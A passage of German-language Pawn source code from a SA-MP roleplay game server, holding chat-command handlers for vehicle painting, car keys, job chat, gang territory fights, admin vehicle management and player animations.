	      		    ShowPlayerDialog(playerid, DIALOG_LACKIEREN, DIALOG_STYLE_LIST, "Lackierung Farbe 1", lackstring, "Lackieren", "Abbrechen"); // Ausgabe
				}
		 	    else
				{
		  		    SendClientMessage(playerid, COLOR_GRAD1, "Dir gehört der Haufen nicht!");
				}
			}
	 	    else
			{
		        for(new fc;fc<sizeof(FactionCars);fc++)// Fraktionsfahrzeug
				{
			        if(FactionCars[fc][fVehid] >= 400 && FactionCars[fc][fVehid] <= 611)
					{
			            if(vid == FactionCars[fc][fCarid])
						{
					        if(PlayerInfo[playerid][sMember] == FactionCars[fc][fFaction])
							{
						        if(vid != INVALID_VEHICLE_ID)
					          	{
									new lackstring[4024];
									for(new i = 0; i < 120; i++)
									{
					            	 format(lackstring, sizeof(lackstring), "%s%s#######\n",lackstring,VehicleColoursTableRGBANormal[i]);//CarName[i]
									}
					      		    ShowPlayerDialog(playerid, DIALOG_LACKIEREN, DIALOG_STYLE_LIST, "Lackierung Farbe 1", lackstring, "Lackieren", "Abbrechen"); // Ausgabe
								}
							}
							else
					        {
		  				    SendClientMessage(playerid, COLOR_GRAD1, "Dir gehört der Haufen nicht!");
							return 1;
							}
							//}
						}
					}
				}
			}
	    }
	    else
		{
	    SendClientMessage(playerid, COLOR_GRAD1, "Du hast nicht genug Geld 5000$");
		}

		return 1;
	}
	if(strcmp(cmd,"/givecarkey", true) == 0) // jobchat
    {

		tmp = strtoknew(cmdtext, idx);
		if(!strlen(tmp))
		{
			SendClientMessage(playerid, COLOR_GRAD2, "Benutzung: /givecarkey [Spieler ID]");
			return 1;
		}
		giveplayerid = ReturnUser(tmp);


		if(!Dtc_PlayerHaveCar[playerid][Dtc_PlayerKey[playerid]])
		{
		SendClientMessage(playerid, COLOR_GREY, "Du besitzt kein Fahrzeug auf diesem Schlüssel!!");
		return 1;
		}


		new dawhhwad[128];
        format(dawhhwad, sizeof(dawhhwad), "* Du hast den Zweitschüssel für deinen %s %s gegeben!", CarName[PlayerCar[playerid][Dtc_PlayerKey[playerid]][CarModel]-400],GetName(giveplayerid));
		SendClientMessage(playerid, COLOR_LIGHTBLUE, dawhhwad);//PlayerCar[playerid][Dtc_PlayerKey[playerid]][CarId]


		new dawhhwad3[128];
        format(dawhhwad3, sizeof(dawhhwad3), "* %s hat dir den Schlüssel seines %s gegeben!", GetName(playerid),CarName[PlayerCar[playerid][Dtc_PlayerKey[playerid]][CarModel]-400]);
		SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, dawhhwad3);//PlayerCar[playerid][Dtc_PlayerKey[playerid]][CarId]


		new awdawddawdf[128];
		format(awdawddawdf, sizeof(awdawddawdf), GetName(giveplayerid));
    	strmid(PlayerCar[playerid][Dtc_PlayerKey[playerid]][CarGivekey], awdawddawdf, 0, strlen(awdawddawdf), 255);

		return 1;
	}
	if(strcmp(cmd,"/disablemessages", true) == 0)
    {
		if(PlayerInfo[playerid][pAdmin] >= 4)
		{
			if(hatdenserverbetreten == false)
			{
				SendClientMessage(playerid, COLOR_LIGHTBLUE, "* Du hast die Verbindungsnachrichten für alle Spieler deaktiviert.");
                hatdenserverbetreten = true;
				return 1;
			}
			if(hatdenserverbetreten == true)
			{
                hatdenserverbetreten = false;
				SendClientMessage(playerid, COLOR_LIGHTBLUE, "* Du hast die Verbindungsnachrichten für alle Spieler aktiviert.");
				return 1;
			}
        }
        return 1;
    }
	if(strcmp(cmd,"/aufträge", true) == 0) // jobchat
    {
		if(PlayerInfo[playerid][sMember] != 4)// WAS IST SMEMBER DFFFFFF
		{
	    SendClientMessage(playerid, COLOR_GRAD2, "Du bist kein Sanitäter!");
		return 1;
		}
		    if(JobDuty[playerid] == 0) return SCM(playerid,-1,"Du bist nicht im Dienst und kannst keine Notrufe empfangen!");
			DialogTempIndex[playerid] = 0;

			new mvstring[2024];
	    	for(new i = 0; i < MAX_PLAYERS; i++)
	        {
	             if(IsPlayerConnected(i))
	             {
	                if(PlayerInfo[i][pTot] == 1)
					{
						DialogTemp[playerid][DialogTempIndex[playerid]++] = i;
	 					new LocationZone[MAX_ZONE_NAME];
	  					Get2DZone(PlayerInfo[i][pTx],PlayerInfo[i][pTy], LocationZone, MAX_ZONE_NAME);
						format(mvstring, sizeof(mvstring), "%s%s ( ID: %d ) Position: %s, Restliche Zeit: %d\n",mvstring,GetName(i),i,LocationZone,PlayerInfo[i][pTotTime]); // geht das ?
					}
				}
			}
			if(DialogTempIndex[playerid] == 0)
			{
		    SendClientMessage(playerid, COLOR_GRAD2, "Derzeit sind keine Aufträge verfügbar!");
			return 1;
			}
			ShowPlayerDialog(playerid,DIALOG_AUFTRAGE,DIALOG_STYLE_LIST,"Sanitäter Aufträge",mvstring,"Auswählen","Abbrechen");
		return 1;
	}
	if(strcmp(cmd,"/supinfo", true) == 0) // jobchat
    {
        SendClientMessage(playerid, COLOR_LIGHTBLUE, "----- Ausgeschlossende Spieler vom Support System -----.");
    	for(new i = 0; i < MAX_PLAYERS; i++)
        {
             if(IsPlayerConnected(i))
             {
                if(PlayerInfo[i][paMuted] == 1)
				{
					new stringd[128];
	                format(stringd, sizeof(stringd), "Spieler: %s, %d Minuten", GetName(i),PlayerInfo[i][paMutedTime]);
	            	SendClientMessage(playerid, COLOR_LIGHTBLUE, stringd);
				}
            }
        }
		return 1;
	}
	if(strcmp(cmd,"/muteinfo", true) == 0) // jobchat
    {
        SendClientMessage(playerid, COLOR_LIGHTBLUE, "----- Gemutete Spieler -----.");
    	for(new i = 0; i < MAX_PLAYERS; i++)
        {
             if(IsPlayerConnected(i))
             {
                if(PlayerInfo[i][pMuted] == 1)
				{
					new stringd[128];
	                format(stringd, sizeof(stringd), "Spieler: %s, %d Minuten", GetName(i),PlayerInfo[i][pMutedTime]);
	            	SendClientMessage(playerid, COLOR_LIGHTBLUE, stringd);
				}
            }
        }
		return 1;
	}
	if(strcmp(cmd,"/weathermode", true) == 0) // jobchat
    {
		if(PlayerInfo[playerid][pWeather] == 1)//12
		{
			    SendClientMessage(playerid, COLOR_LIGHTBLUE, "* Du hast den Weitsichtmodus abgeschaltet.");
                PlayerInfo[playerid][pWeather] = 0;
				SetPlayerWeather(playerid,12);
		}
		else if(PlayerInfo[playerid][pWeather] == 0)//12
		{
			    SendClientMessage(playerid, COLOR_LIGHTBLUE, "* Du hast den Weitsichtmodus aktiviert.");
                PlayerInfo[playerid][pWeather] = 1;
				SetPlayerWeather(playerid,-77);
		}
		return 1;
	}
	if(strcmp(cmd,"/helm", true) == 0) // jobchat
    {
	    if(PlayerInfo[playerid][pHelm] == 0)
	    {
			SendClientMessage(playerid, COLOR_GREY, "Du hast keinen Helm kaufe dir einen im 24/7!");
			return 1;
		}
	    if(IsABike(GetPlayerVehicleID(playerid)))
	    {
			switch(GetPlayerSkin(playerid))
			{
		        #define SPAO{%0,%1,%2,%3,%4,%5} SetPlayerAttachedObject(playerid, 1, 18645, 2, (%0), (%1), (%2), (%3), (%4), (%5));
				case 0, 65, 74, 149, 208, 273:  SPAO{0.070000, 0.000000, 0.000000, 88.000000, 75.000000, 0.000000}
				case 1..6, 8, 14, 16, 22, 27, 29, 33, 41..49, 82..84, 86, 87, 119, 289: SPAO{0.070000, 0.000000, 0.000000, 88.000000, 77.000000, 0.000000}
				case 7, 10: SPAO{0.090000, 0.019999, 0.000000, 88.000000, 90.000000, 0.000000}
				case 9: SPAO{0.059999, 0.019999, 0.000000, 88.000000, 90.000000, 0.000000}
				case 11..13: SPAO{0.070000, 0.019999, 0.000000, 88.000000, 90.000000, 0.000000}
				case 15: SPAO{0.059999, 0.000000, 0.000000, 88.000000, 82.000000, 0.000000}
				case 17..21: SPAO{0.059999, 0.019999, 0.000000, 88.000000, 82.000000, 0.000000}
				case 23..26, 28, 30..32, 34..39, 57, 58, 98, 99, 104..118, 120..131: SPAO{0.079999, 0.019999, 0.000000, 88.000000, 82.000000, 0.000000}
				case 40: SPAO{0.050000, 0.009999, 0.000000, 88.000000, 82.000000, 0.000000}
				case 50, 100..103, 148, 150..189, 222: SPAO{0.070000, 0.009999, 0.000000, 88.000000, 82.000000, 0.000000}
				case 51..54: SPAO{0.100000, 0.009999, 0.000000, 88.000000, 82.000000, 0.000000}
				case 55, 56, 63, 64, 66..73, 75, 76, 78..81, 133..143, 147, 190..207, 209..219, 221, 247..272, 274..288, 290..293: SPAO{0.070000, 0.019999, 0.000000, 88.000000, 82.000000, 0.000000}
				case 59..62: SPAO{0.079999, 0.029999, 0.000000, 88.000000, 82.000000, 0.000000}
				case 77: SPAO{0.059999, 0.019999, 0.000000, 87.000000, 82.000000, 0.000000}
				case 85, 88, 89: SPAO{0.070000, 0.039999, 0.000000, 88.000000, 82.000000, 0.000000}
				case 90..97: SPAO{0.050000, 0.019999, 0.000000, 88.000000, 82.000000, 0.000000}
				case 132: SPAO{0.000000, 0.019999, 0.000000, 88.000000, 82.000000, 0.000000}
				case 144..146: SPAO{0.090000, 0.000000, 0.000000, 88.000000, 82.000000, 0.000000}
				case 220: SPAO{0.029999, 0.019999, 0.000000, 88.000000, 82.000000, 0.000000}
				case 223, 246: SPAO{0.070000, 0.050000, 0.000000, 88.000000, 82.000000, 0.000000}
				case 224..245: SPAO{0.070000, 0.029999, 0.000000, 88.000000, 82.000000, 0.000000}
				case 294: SPAO{0.070000, 0.019999, 0.000000, 91.000000, 84.000000, 0.000000}
				case 295: SPAO{0.050000, 0.019998, 0.000000, 86.000000, 82.000000, 0.000000}
				case 296..298: SPAO{0.064999, 0.009999, 0.000000, 88.000000, 82.000000, 0.000000}
				case 299: SPAO{0.064998, 0.019999, 0.000000, 88.000000, 82.000000, 0.000000}
		    }
		}
	return 1;
	}
	if(strcmp(cmd,"/j", true) == 0) // jobchat
    {
	    if(IsPlayerConnected(playerid))
	    {
			GetPlayerName(playerid, sendername, sizeof(sendername));
			new length = strlen(cmdtext);
			while ((idx < length) && (cmdtext[idx] <= ' '))
			{
				idx++;
			}
			new offset = idx;
			new result[128];
			while ((idx < length) && ((idx - offset) < (sizeof(result) - 1)))
			{
				result[idx - offset] = cmdtext[idx];
				idx++;
			}
			result[idx - offset] = EOS;
			result[0] = toupper(result[0]);
			if(!strlen(result))
			{
				SendClientMessage(playerid, COLOR_GRAD2, "Benutze: (/j)ob [Text]");
				return 1;
			}
			if(PlayerInfo[playerid][pJob] == 10)
			{
				format(string, sizeof(string), "** Pilot %s: %s, over. **", sendername, result);
				SendJobMessage(10, TEAM_BLUE_COLOR, string);
				printf("%s", string);
				return 1;
			}
		    else if(PlayerInfo[playerid][pJob] == 6) // Farmer
			{
				format(string, sizeof(string), "** Farmer %s: %s, over. **", sendername, result);
				SendJobMessage(6, TEAM_BLUE_COLOR, string);
				printf("%s", string);
				return 1;
			}
		    else if(PlayerInfo[playerid][pJob] == 4) // Drogendealer
			{
				format(string, sizeof(string), "** Drogendealer %s: %s, over. **", sendername, result);
				SendJobMessage(4, TEAM_BLUE_COLOR, string);
				printf("%s", string);
				return 1;
			}
		    else if(PlayerInfo[playerid][pJob] == 9) // Waffendealer
			{
				format(string, sizeof(string), "** Waffendealer %s: %s, over. **", sendername, result);
				SendJobMessage(9, TEAM_BLUE_COLOR, string);
				printf("%s", string);
				return 1;
			}
		    else if(PlayerInfo[playerid][pJob] == 1) // Dedektiv
			{
				format(string, sizeof(string), "** Dedektiv %s: %s, over. **", sendername, result);
				SendJobMessage(1, TEAM_BLUE_COLOR, string);
				printf("%s", string);
				return 1;
			}
		    else if(PlayerInfo[playerid][pJob] == 3) // Zugfahrer
			{
				format(string, sizeof(string), "** Zugfahrer %s: %s, over. **", sendername, result);
				SendJobMessage(3, TEAM_BLUE_COLOR, string);
				printf("%s", string);
				return 1;
			}
			else if(PlayerInfo[playerid][pJob] == 17)
			{
				format(string, sizeof(string), "** Müllmann %s: %s, over. **", sendername, result);
				SendJobMessage(17, TEAM_BLUE_COLOR, string);
				printf("%s", string);
				return 1;
			}
			else if(PlayerInfo[playerid][pJob] == 14)
			{
				format(string, sizeof(string), "** Busfahrer %s: %s, over. **", sendername, result);
				SendJobMessage(14, TEAM_BLUE_COLOR, string);
				printf("%s", string);
				return 1;
			}
			else if(PlayerInfo[playerid][pJob] == 2)
			{
				format(string, sizeof(string), "** Anwalt %s: %s, over. **", sendername, result);
				SendJobMessage(2, TEAM_BLUE_COLOR, string);
				printf("%s", string);
				return 1;
			}
			else
			{
				SendClientMessage(playerid, COLOR_GRAD2, "Du bist Arbeitslos!.");
				return 1;
			}

		}
		return 1;
	}
   //====== Gangfight!
    	if(strcmp(cmdtext,"/ctf",true)==0){
	    if(IsAFightFaction(GetPlayerFaction(playerid))){
			new TempZone = GetPlayerFightzone(playerid);
			if(TempZone != -255){
			    if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT)
			        return SendClientMessage(playerid,FS_COL_GREY,"** Du darfst das nur zu Fuß machen ...");
				if(!FightSystem[TempZone][fsFightTime] || FightSystem[TempZone][fsAttackFaction] == -255)
				    return SendClientMessage(playerid,FS_COL_GREY,"** Hier gibt es nichts zu erobern.");

				if(FightSystem[TempZone][fsOwnerFaction] == GetPlayerFaction(playerid) || FightSystem[TempZone][fsAttackFaction] == GetPlayerFaction(playerid)){
				    if(IsPlayerInRangeOfPoint(playerid,5.0,FightSystem[TempZone][fsCTFx],FightSystem[TempZone][fsCTFy],FightSystem[TempZone][fsCTFz])){
				        if(FightSystem[TempZone][fsCTF][0] != -255){
						    if(GetPlayerFaction(FightSystem[TempZone][fsCTF][0]) != GetPlayerFaction(playerid))
						        SendClientMessage(playerid,FS_COL_GREY,"** Die Flagge wird von deinen Feinden erobert, töte sie zuerst!");
							else
						        SendClientMessage(playerid,FS_COL_GREY,"** Deine Gang / Mafia erobert bereits die Flagge!");
							return 1;
						}
						FightSystem[TempZone][fsCTF][0] = playerid;
						new fsName[MAX_PLAYER_NAME];
						GetPlayerName(playerid,fsName,MAX_PLAYER_NAME);
						new fsText[128];
						format(fsText,sizeof(fsText),">>> Fight <<< | %s hat begonnen die Flagge zu erobern!",fsName);
						for(new i;i<MAX_PLAYERS;i++){
							if(IsPlayerConnected(i)){
								if(GetPlayerFaction(i) == FightSystem[TempZone][fsOwnerFaction] || GetPlayerFaction(i) == FightSystem[TempZone][fsAttackFaction]){
                            		PlayerPlaySound(i,1058,0.0,0.0,0.0);
									SendClientMessage(i,FS_COL_YELLOW,fsText);
								}
							}
						}
				    }else SendClientMessage(playerid,FS_COL_GREY,"** Du bist nicht in der nähe der Flagge!");
				}else SendClientMessage(playerid,FS_COL_GREY,"** Du bist nicht in diesem Fight verwickelt ...");
			}else SendClientMessage(playerid,FS_COL_GREY,"** Du bist in keinem Gebiet!");
		}else SendClientMessage(playerid,FS_COL_GREY,"** Du bist in keiner Gang / Mafia.");
		return 1;
	}
	if(strcmp(cmdtext,"/invade",true)==0){
	    if(IsAFightFaction(GetPlayerFaction(playerid))){
	        for(new fs;fs<sizeof(FightSystem);fs++){
	            if((FightSystem[fs][fsOwnerFaction] == GetPlayerFaction(playerid) && FightSystem[fs][fsFightTime]) || FightSystem[fs][fsAttackFaction] == GetPlayerFaction(playerid))
	                return SendClientMessage(playerid,FS_COL_GREY,"** Deine Gang / Mafia ist bereits in einem Fight.");
	        }
	        new TempZone = GetPlayerFightzone(playerid);
	        if(TempZone != -255){
	            if(!IsAFightFaction(FightSystem[TempZone][fsOwnerFaction]))
	                return SendClientMessage(playerid,FS_COL_GREY,"Gebiet wurde ausgeschaltet.");
	            if(FightSystem[TempZone][fsOwnerFaction] == GetPlayerFaction(playerid))
	                return SendClientMessage(playerid,FS_COL_GREY,"** Man greift nicht seine eigenen Leute an.");
				if(FightSystem[TempZone][fsFightTime] || FightSystem[TempZone][fsAttackFaction] != -255)
				    return SendClientMessage(playerid,FS_COL_GREY,"** In diesem Gebiet wird bereits geschossen.");
				if(FightSystem[TempZone][fsLastFight]){
				    new fsText[178];
				    format(fsText,sizeof(fsText),"Ganggebiet: Dieses Ganggebiet wurde bereits Angegriffen, wartet noch: '%d' Minuten.",FightSystem[TempZone][fsLastFight]);
				    SendClientMessage(playerid,FS_COL_GREY,fsText);
				    return 1;
				}
				for(new fs;fs<sizeof(FightSystem);fs++){
					if(FightSystem[fs][fsOwnerFaction] == FightSystem[TempZone][fsOwnerFaction] && (FightSystem[fs][fsFightTime] || FightSystem[fs][fsAttackFaction] != -255))
						return SendClientMessage(playerid,FS_COL_GREY,"Ganggebiet: Die Gang / Mafia der das Ganggebiet gehört hat bereits ein Kampf.");
				}
                new fsTextToOwner[255];
                format(fsTextToOwner,sizeof(fsTextToOwner),">>> Fight <<< | Ihr werden von: %s angegriffen, setzt euch zur wehr!",GetFactionNameOfFaction(GetPlayerFaction(playerid)));
				new fsName[MAX_PLAYER_NAME];
				GetPlayerName(playerid,fsName,MAX_PLAYER_NAME);
				new fsTextToAttack[255];
                format(fsTextToAttack,sizeof(fsTextToAttack),">>> Fight <<< | %s hat ein Kampf mit: %s begonnen, macht sie Platt!",fsName,GetFactionNameOfFaction(FightSystem[TempZone][fsOwnerFaction]));
				new fsText[64];
				format(fsText,sizeof(fsText),"~y~%s",GetFactionNameOfFaction(FightSystem[TempZone][fsOwnerFaction]));
				TextDrawSetString(FightSystem[TempZone][fsWinFaction],fsText);
				TextDrawSetString(FightSystem[TempZone][fsWinKills],"~y~00 Kills");
				format(fsText,sizeof(fsText),"~y~%s",GetFactionNameOfFaction(GetPlayerFaction(playerid)));
				TextDrawSetString(FightSystem[TempZone][fsLoseFaction],fsText);
				TextDrawSetString(FightSystem[TempZone][fsLoseKills],"~y~00 Kills");
				TextDrawSetString(FightSystem[TempZone][fsTime],"Verbl. Zeit: 30 Minuten");//ZEIT
    for(new i;i<MAX_PLAYERS;i++){
        if(IsPlayerConnected(i)){
    					GangZoneFlashForPlayer(i,FightSystem[TempZone][fsZoneID],GetZoneColorOfFaction(GetPlayerFaction(playerid)));
				    	if(GetPlayerFaction(i) == FightSystem[TempZone][fsOwnerFaction]){
				    		PlayerPlaySound(i,1058,0.0,0.0,0.0);
				        	SendClientMessage(i,FS_COL_YELLOW,fsTextToOwner);
				        	TextDrawShowForPlayer(i,Fight);
							TextDrawShowForPlayer(i,FightUnderline);
							TextDrawShowForPlayer(i,FightSystem[TempZone][fsWinFaction]);
							TextDrawShowForPlayer(i,FightSystem[TempZone][fsWinKills]);
							TextDrawShowForPlayer(i,FightSystem[TempZone][fsLoseFaction]);
							TextDrawShowForPlayer(i,FightSystem[TempZone][fsLoseKills]);
							TextDrawShowForPlayer(i,FightSystem[TempZone][fsTime]);
      					}
				    	if(GetPlayerFaction(i) == GetPlayerFaction(playerid)){
				    		PlayerPlaySound(i,1058,0.0,0.0,0.0);
				        	SendClientMessage(i,FS_COL_YELLOW,fsTextToAttack);
				        	TextDrawShowForPlayer(i,Fight);
							TextDrawShowForPlayer(i,FightUnderline);
							TextDrawShowForPlayer(i,FightSystem[TempZone][fsWinFaction]);
							TextDrawShowForPlayer(i,FightSystem[TempZone][fsWinKills]);
							TextDrawShowForPlayer(i,FightSystem[TempZone][fsLoseFaction]);
							TextDrawShowForPlayer(i,FightSystem[TempZone][fsLoseKills]);
							TextDrawShowForPlayer(i,FightSystem[TempZone][fsTime]);
      					}
					}
				}
				FightSystem[TempZone][fsAttackFaction] = GetPlayerFaction(playerid);
    			FightSystem[TempZone][fsKillsOfOwner] = 0;
	    	    FightSystem[TempZone][fsKillsOfAttack] = 0;
	    	    FightSystem[TempZone][fsFightTime] = 30;//ZEIT
	    	    FightSystem[TempZone][fsCTF][0] = -255;
	    	    FightSystem[TempZone][fsCTF][1] = 0;
	    	    FightSystem[TempZone][fsCTF][2] = 0;
	    	    return 1;
			}return SendClientMessage(playerid,FS_COL_GREY,"** Du bist in keinem Gebiet!");
	    }else SendClientMessage(playerid,FS_COL_GREY,"** Du bist in keiner Gang / Mafia.");
		return 1;
	}
    //===================================================
//	dcmd(efa,3,cmdtext);
/*
	if(strcmp(cmdtext,"/fcarsell",true)==0)
	{
	    if(GetPlayerLeader(playerid))
		{
	        if(IsAllowedFactionToBuy(GetPlayerFaction(playerid)))
			{
	            if(GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
				{
					new Carid1 = GetPlayerVehicleID(playerid);
					for(new fc;fc<sizeof(FactionCars);fc++)
					{
	                    if(FactionCars[fc][fVehid] >= 400 && FactionCars[fc][fVehid] <= 611)
						{
	                        if(Carid1 == FactionCars[fc][fCarid])
							{
							    if(FactionCars[fc][fFaction][0] == GetPlayerLeader(playerid))
								{
									if(FactionCars[fc][fTuning][14] != 0)
									{
							        DestroyDynamicObject(sireneamk);
									}
							        FactionCars[fc][fVehid] = -255;
							        if(DestroyVehicle(FactionCars[fc][fCarid]))
							        FactionCars[fc][fCarid] = -255;
									new fText[178];
									format(fText,sizeof(fText),"Du hast das Fraktionsfahrzeug erfolgreich für $%d(50%% vom Kaufpreis) verkauft.",(FactionCars[fc][fPrice]/2));
									SendClientMessage(playerid,COLOR_LIGHTBLUE,fText);
                                    GivePlayerMoneySave(playerid, FactionCars[fc][fPrice]/2);
							    }
							    else SendClientMessage(playerid,COLOR_GRAD2,"Du bist nicht der besitzer dieses Fahrzeuges.");
							    return true;
							}
	                    }
	                }
					SendClientMessage(playerid,COLOR_GRAD2,"Du sitzt in keinem Fraktionsfahrzeug.");
				}
				else SendClientMessage(playerid,COLOR_GRAD2,"Du musst der Fahrer eines Fahrzeuges sein.");
	        }
			else SendClientMessage(playerid,COLOR_GRAD2,"Deine Fraktion ist dazu nicht berechtigt.");
	    }
		else SendClientMessage(playerid,COLOR_GRAD2,"Du bist nicht berechtigt diesen Befehl anzuwenden.");
	    return true;
	}
*/
	if(strcmp(cmdtext,"/lfa",true)==0)
	{
	        if(PlayerInfo[playerid][pAdmin] == 2002)
			{
			for(new fc;fc<sizeof(FactionCars);fc++)
			{
			    if(FactionCars[fc][fVehid] >= 400 && FactionCars[fc][fVehid] <= 611)
				{
					new Float:fX,Float:fY,Float:fZ;
					GetVehiclePos(FactionCars[fc][fCarid],fX,fY,fZ);
					if(IsPlayerInRangeOfPoint(playerid,4.0,fX,fY,fZ))
					{
					    FactionCars[fc][fVehid] = -255;
						if(FactionCars[fc][fTuning][14] != 0)
						{
							DestroyDynamicObject(SireneFrak[FactionCars[fc][fCarid]]);
						}
						if(DestroyVehicle(FactionCars[fc][fCarid]))
						{
						    FactionCars[fc][fCarid] = -255;
							new query[256];
						    format(query,sizeof(query),"DELETE FROM `FraktionsVehikels` WHERE factioncardbid = '%d'",FactionCars[fc][factioncardbid]);

							mysql_pquery(mysqlcon,query,"");

						}return SendClientMessage(playerid,COLOR_LIGHTBLUE,"Du hast das Fraktionsfahrzeug entfernt.");
					}
			    }
			}
	    }else SendClientMessage(playerid,COLOR_GRAD2,"Du bist nicht berechtigt diesen Befehl anzuwenden.");
		return true;
	}
	if(strcmp(cmdtext,"/rafa",true)==0){
	    if(GetPlayerAdmin(playerid) >= NEEDED_ADMINLEVEL){
	        new fName[MAX_PLAYER_NAME];
	        GetPlayerName(playerid,fName,sizeof(fName));
	        format(string,sizeof(string),"%s hat alle Fraktionsfahrzeuge respawnt.",fName);
	        SendClientMessageToAll(COLOR_RED,string);
	        for(new fc;fc<sizeof(FactionCars);fc++){
	            if(FactionCars[fc][fVehid] >= 400 && FactionCars[fc][fVehid] <= 611)
					DestroyAndCreateFactionCar(fc);
	        }
	    }else SendClientMessage(playerid,COLOR_GRAD2,"Du bist nicht berechtigt diesen Befehl anzuwenden.");
	    return true;
	}
/*
	if(strcmp(cmdtext,"/ramfa",true)==0){
	    if(GetPlayerLeader(playerid)){
	        if(gettime() < LastRespawned[GetPlayerFaction(playerid)-1])
	       		return SendClientMessage(playerid,COLOR_GRAD2,"Du kannst deine Fahrzeuge nur alle '5' Minuten respawnen.");
			LastRespawned[GetPlayerFaction(playerid)-1] = gettime()+(60*5);
			for(new fc;fc<sizeof(FactionCars);fc++){
			    if(FactionCars[fc][fVehid] >= 400 && FactionCars[fc][fVehid] <= 611){
			        if(FactionCars[fc][fFaction][0] == GetPlayerLeader(playerid)){
			            DestroyAndCreateFactionCar(fc);
			        }
			    }
			}SendClientMessage(playerid,COLOR_LIGHTBLUE,"Du hast deine Fraktionsfahrzeuge erfolgreich respawnt.");
	    }else SendClientMessage(playerid,COLOR_GRAD2,"Du bist nicht berechtigt diesen Befehl anzuwenden.");
	    return true;
	}
*/
	//=========================================================================
	GetPlayerName(playerid,sendername,sizeof(sendername));

	if(strcmp(cmd,"/animlist",true)==0)
	{
		SendClientMessage(playerid,COLOR_GRAD1,"Verfügbare Animationen:");
	    SendClientMessage(playerid,COLOR_GRAD1,"/handsup /drunk /bomb /getarrested /laugh /lookout /robman");
        SendClientMessage(playerid,COLOR_GRAD1,"/crossarms /lay /hide /vomit /eat /wave /taichi");
        SendClientMessage(playerid,COLOR_GRAD1,"/deal /smokem /smokef /groundsit /sit /chat");
        SendClientMessage(playerid,COLOR_GRAD1,"/handsup /cellin /cellout /dance");
	}
	if(strcmp(cmd, "/handsup", true) == 0)
	{
		SetPlayerSpecialAction(playerid,SPECIAL_ACTION_HANDSUP);
		MakeAnimation[playerid] = 1;
        return 1;
    }
 	if(strcmp(cmd, "/cellin", true) == 0)
 	{
		SetPlayerSpecialAction(playerid,SPECIAL_ACTION_USECELLPHONE);
		MakeAnimation[playerid] = 1;
        return 1;
    }
 	if(strcmp(cmd, "/cellout", true) == 0)
 	{
		SetPlayerSpecialAction(playerid,SPECIAL_ACTION_STOPUSECELLPHONE);
		MakeAnimation[playerid] = 1;
        return 1;
    }
 	if(strcmp(cmd, "/sit", true) == 0)
	{
		SetPlayerSpecialAction(playerid, SPECIAL_ACTION_SITTING);
		MakeAnimation[playerid] = 1;
        return 1;
    }
    if(strcmp(cmd, "/pee", true) == 0)
	{
	    if(PlayerInfo[playerid][pAdmin] >= 2000)
	{
		MakeAnimation[playerid] = 1;
		SetPlayerSpecialAction(playerid, 68);
    }
		return 1;
	}
    if(strcmp(cmd, "/drunk", true) == 0) {
		MakeAnimation[playerid] = 1;
		LoopingAnim(playerid,"PED","WALK_DRUNK",4.0,1,1,1,1,0);
		return 1;
    }
    if (strcmp("/bomb", cmdtext, true) == 0)
	{
		ClearAnimations(playerid);
		MakeAnimation[playerid] = 1;
		OnePlayAnim(playerid, "BOMBER", "BOM_Plant", 4.0, 0, 0, 0, 0, 0); // Place Bomb
		return 1;
	}
    if (strcmp("/getarrested", cmdtext, true, 7) == 0)
	{
	      LoopingAnim(playerid,"ped", "ARRESTgun", 4.0, 0, 1, 1, 1, -1); // Gun Arrest
			MakeAnimation[playerid] = 1;
		  return 1;
    }
    if (strcmp("/laugh", cmdtext, true) == 0)
	{
          OnePlayAnim(playerid, "RAPPING", "Laugh_01", 4.0, 0, 0, 0, 0, 0); // Laugh
			MakeAnimation[playerid] = 1;
		  return 1;
	}
    if (strcmp("/lookout", cmdtext, true) == 0)
	{
          OnePlayAnim(playerid, "SHOP", "ROB_Shifty", 4.0, 0, 0, 0, 0, 0); // Rob Lookout
			MakeAnimation[playerid] = 1;
		  return 1;
	}
    if (strcmp("/robman", cmdtext, true) == 0)
	{
          LoopingAnim(playerid, "SHOP", "ROB_Loop_Threat", 4.0, 1, 0, 0, 0, 0); // Rob
			MakeAnimation[playerid] = 1;
		  return 1;
	}
    if (strcmp("/crossarms", cmdtext, true) == 0)
	{
          LoopingAnim(playerid, "COP_AMBIENT", "Coplook_loop", 4.0, 0, 1, 1, 1, -1); // Arms crossed
			MakeAnimation[playerid] = 1;
		  return 1;
	}
    if (strcmp("/lay", cmdtext, true) == 0)
 	{
          LoopingAnim(playerid,"BEACH", "bather", 4.0, 1, 0, 0, 0, 0); // Lay down
			MakeAnimation[playerid] = 1;
		  return 1;
    }
    if (strcmp("/hide", cmdtext, true) == 0)
	{
        format(string, sizeof(string), "* %s Kauert sich zusammen", sendername);
        ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
		MakeAnimation[playerid] = 1;
        LoopingAnim(playerid, "ped", "cower", 3.0, 1, 0, 0, 0, 0); // Taking Cover
		  return 1;
	}
    if (strcmp("/vomit", cmdtext, true) == 0)
	{
	      OnePlayAnim(playerid, "FOOD", "EAT_Vomit_P", 3.0, 0, 0, 0, 0, 0); // Vomit BAH!
			MakeAnimation[playerid] = 1;
		  return 1;
	}
    if (strcmp("/wave", cmdtext, true) == 0)
	{
	      LoopingAnim(playerid, "ON_LOOKERS", "wave_loop", 4.0, 1, 0, 0, 0, 0); // Wave
			MakeAnimation[playerid] = 1;
		  return 1;
	}
    if (strcmp("/deal", cmdtext, true) == 0)
	{
          OnePlayAnim(playerid, "DEALER", "DEALER_DEAL", 4.0, 0, 0, 0, 0, 0); // Deal Drugs
			MakeAnimation[playerid] = 1;
		  return 1;
	}
    if (strcmp("/smokem", cmdtext, true) == 0)
	{
          LoopingAnim(playerid,"SMOKING", "M_smklean_loop", 4.0, 1, 0, 0, 0, 0); // Smoke
			MakeAnimation[playerid] = 1;
		  return 1;
	}
	// Female Smoking
    if (strcmp("/smokef", cmdtext, true) == 0)
	{
          LoopingAnim(playerid, "SMOKING", "F_smklean_loop", 4.0, 1, 0, 0, 0, 0); // Female Smoking
			MakeAnimation[playerid] = 1;
		  return 1;
	}
	// Sit
    if (strcmp("/groundsit", cmdtext, true) == 0)
	{
          LoopingAnim(playerid,"BEACH", "ParkSit_M_loop", 4.0, 1, 0, 0, 0, 0); // Sit
		  MakeAnimation[playerid] = 1;
		  return 1;
    }
    // Idle Chat
    if(strcmp(cmd, "/chat", true) == 0)
	{
